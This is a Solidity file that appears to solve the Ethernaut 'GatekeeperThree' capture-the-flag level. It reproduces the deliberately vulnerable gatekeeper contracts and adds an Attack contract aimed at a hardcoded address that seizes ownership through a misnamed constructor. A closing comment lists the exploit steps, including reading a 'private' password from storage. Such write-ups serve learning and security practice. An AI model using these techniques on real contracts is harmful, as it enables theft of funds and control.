//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SimpleTrick {
  GatekeeperThree public target;
  address public trick;
  uint private password = block.timestamp;

  constructor (address payable _target) {
    target = GatekeeperThree(_target);
  }
    
  function checkPassword(uint _password) public returns (bool) {
    if (_password == password) {
      return true;
    }
    password = block.timestamp;
    return false;
  }
    
  function trickInit() public {
    trick = address(this);
  }
    
  function trickyTrick() public {
    if (address(this) == msg.sender && address(this) != trick) {
      target.getAllowance(password);
    }
  }
}

contract GatekeeperThree {
  address public owner;
  address public entrant;
  bool public allow_enterance = false;
  SimpleTrick public trick;

  function construct0r() public {
      owner = msg.sender;
  }

  modifier gateOne() {
    require(msg.sender == owner);
    require(tx.origin != owner);
    _;
  }

  modifier gateTwo() {
    require(allow_enterance == true);
    _;
  }

  modifier gateThree() {
    if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
      _;
    }
  }

  function getAllowance(uint _password) public {
    if (trick.checkPassword(_password)) {
        allow_enterance = true;
    }
  }

  function createTrick() public {
    trick = new SimpleTrick(payable(address(this)));
    trick.trickInit();
  }

  function enter() public gateTwo gateTwo gateThree returns (bool entered) {
    entrant = tx.origin;
    return true;
  }

  receive () external payable {}
}

contract Attack {
    address _addr = 0x0f7230f1f64e5B264679Cec215B091f5dc5c9911;

    function kekOwnership() public {
        IGT(_addr).construct0r();
    }

    function kekEnter() public {
        IGT(_addr).enter();
    }
}

contract checkPass {
    function check() public pure returns (uint256) {
        return uint(0x0000000000000000000000000000000000000000000000000000000063d2e988); //1674766728
    }
}

interface IGT {
    function construct0r() external;
    function enter() external returns (bool entered);
}

/*

1. createTrick()
2. get SimpleTrick's address
3. web3.eth.getStorageAt("SimpleTrick's address",2) -> password -> checkPass for password in uint
4. getAllowance(password)
5. deploy Attack
5. kekOwnership()
6. send 0.0011 eth to GatekeeperThree's address
7. kekEnter()

*/


















